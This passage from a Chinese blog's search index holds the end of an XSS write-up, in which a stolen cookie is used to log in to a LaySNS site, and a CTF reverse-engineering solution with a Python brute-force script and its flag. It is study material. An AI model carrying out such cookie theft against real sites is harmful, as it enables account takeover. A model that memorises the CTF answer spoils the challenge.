class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p><p><img alt="" data-src="/2018/12/26/xss_laysns/2.png" class="lazyload"></p><p>登录成功，攻击完成！</p><p>0x03结语</p><p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>just reverse it</title>
      <link href="/2018/12/10/reverse/"/>
      <url>/2018/12/10/reverse/</url>
      
        <content type="html"><![CDATA[<p>IDA打开程序，查看start函数C伪代码。<br><img alt="" data-src="/2018/12/10/reverse/001.png" class="lazyload"><br>首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402573是MD5计算函数，将4个部分的MD5值存放在64字节大小的v6中。具体对应关系如下图(每一格表示一个字节)。<br><img alt="" data-src="/2018/12/10/reverse/002.png" class="lazyload"></p><p>如何看出sub_402573函数是MD5算法，进入该函数，看到两个函数，进入第一个，有一些初始赋值的操作，猜测为MD5。再返回来看v6，v6占64个字节，分成四部分就是16字节，每个字节包含两个十六进制，刚好每部分可以存一个MD5值，进一步猜测为MD5算法。于是动态调试进行验证。</p><p>将程序丢入od，在call sub_402573的地方下断点，运行程序，输入“1234567890123456”，继续运行，跟踪v6所在的内存，如下图，发现与“1234”、“5678”、“9012”、“3456”的MD5值相同，验证猜测。</p><p><img alt="" data-src="/2018/12/10/reverse/003.png" class="lazyload"></p><p>接着到了strtol函数，这是一个C语言库函数。这里的意思是将v12的值转化为十六进制，中间的参数‘0’表示不返回非法字符串，意味着输入的每个字符应该是十六进制字符，否则每一部分可能就少于4个字符。由图2可知v12[3]+3、v12[2]+2、v12[1]+1、v12刚好对应每一部分字符串。</p><p>sub_4025b1函数，v12[3]+3 &gt; v12[2]+2 &gt; v12[1]+1 &gt; v12 &gt; 999，保证输入顺序。</p><p><img alt="" data-src="/2018/12/10/reverse/004.png" class="lazyload"></p><p>sub_402513函数，是这道题最复杂的地方。首先来看传参，a1为输入值的一部分，a2为该部分的MD5值。关于小头位序存储方式，例如1234存为0x 34 12。因此，a2&gt;&gt;4即为MD5值的第一个字符，a2&amp;0xF为第二字符，(a2+1)&gt;&gt;4为第三个字符，(a2+1)&amp;0xF为第四个字符，这里只取MD5前四个字符作比较。</p><p>数字+48和字母+87是将十六进制转为assic码(ord(‘0’-0)=48，ord(‘a’-a)=87)。</p><p>v3是int型，占四个字节，分别为LOBYTE、BYTE1,、BYTE2、BYTE3。因此是将MD5值的3241与原字符串1234作比较，相等则为真。</p><p><img alt="" data-src="/2018/12/10/reverse/005.png" class="lazyload"></p><p>最后和固定字符串进行异或得到flag，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                                md5=hashlib.md5()</span><br><span class="line">                                md5.update((i+j+k+l).encode(<span class="string">'utf8'</span>))</span><br><span class="line">                                <span class="keyword">if</span> md5.hexdigest()[:<span class="number">4</span>]==l+j+i+k:</span><br><span class="line">                                        sys.stdout.write(i+j+k+l)</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">"d\x01@flQAizAST\biTB"</span></span><br><span class="line">a = <span class="string">"31795a469327c6e6"</span></span><br><span class="line">flag = strxor(v3,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nflag&#123;%s&#125;"</span>%flag</span><br></pre></td></tr></table></figure><p>输入字符串为”31795a469327c6e6”，flag为：flag{W0w_Y0u_Crack_1t}</p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>note</title>
      <link href="/2018/11/26/note/"/>
      <url>/2018/11/26/note/</url>
      
        <content type="html"><![CDATA[<p>life is beautiful!</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
